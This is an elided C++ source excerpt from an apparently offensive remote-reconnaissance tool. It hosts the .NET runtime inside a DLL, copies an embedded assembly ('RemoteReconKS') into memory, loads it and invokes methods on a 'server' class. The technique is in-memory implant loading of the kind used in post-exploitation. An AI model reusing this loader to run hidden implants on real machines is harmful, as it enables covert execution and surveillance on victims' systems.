// RemoteReconHost.cpp : Defines the exported functions for the DLL application.
//
...
bool createHost(ICorRuntimeHost** ppCorRuntimeHost)
{
	...
	if (hMscoree)
	{
		bool CLRv2Support = CheckNetfxVersionUsingMscoree(NETFX_20_VERSION_STRING, hMscoree);
		bool CLRv4Support = CheckNetfxVersionUsingMscoree(NETFX_40_VERSION_STRING, hMscoree);
		...
		if (CLRv4Support)
		{
			if (CLRv2Support)
			{
				ret = createDotNetFourHost((LPCWSTR)NETFX_20_VERSION_STRING, ppCorRuntimeHost, hMscoree);
			}
			else
			{
				ret = createDotNetFourHost((LPCWSTR)NETFX_40_VERSION_STRING, ppCorRuntimeHost, hMscoree);
			}
		}
		else if (CLRv2Support)
		{
			ret = createDotNetTwoHost((LPCWSTR)NETFX_20_VERSION_STRING, hMscoree, ppCorRuntimeHost);
		}
		else
		{
			ret = false;
...
void InvokeMethod(_TypePtr spType, wchar_t* method, wchar_t* command)
{
	...
	if (FAILED(hr))
	{
		wprintf(L"Failed to start RemoteRecon w/hr 0x%08lx\n", hr);
		return;
	}
	else
	{
...
HRESULT SetupRuntime(_Type** RnRRuntime)
{
	...
	bstr_t bstrAssemblyName("RemoteReconKS");
	_AssemblyPtr spAssembly = NULL;

	// The .NET class to instantiate.
	bstr_t bstrClassName("server.server");
	...
	bounds[0].cElements = REMOTERECONKS_dll_len;
	bounds[0].lLbound = 0;

	SAFEARRAY* arr = SafeArrayCreate(VT_UI1, 1, bounds);
	SafeArrayLock(arr);
	memcpy(arr->pvData, RemoteReconKS_dll, REMOTERECONKS_dll_len);
	SafeArrayUnlock(arr);
	...
	hr = spAssembly->GetType_2(bstrClassName, RnRRuntime);
	if (FAILED(hr))
	{
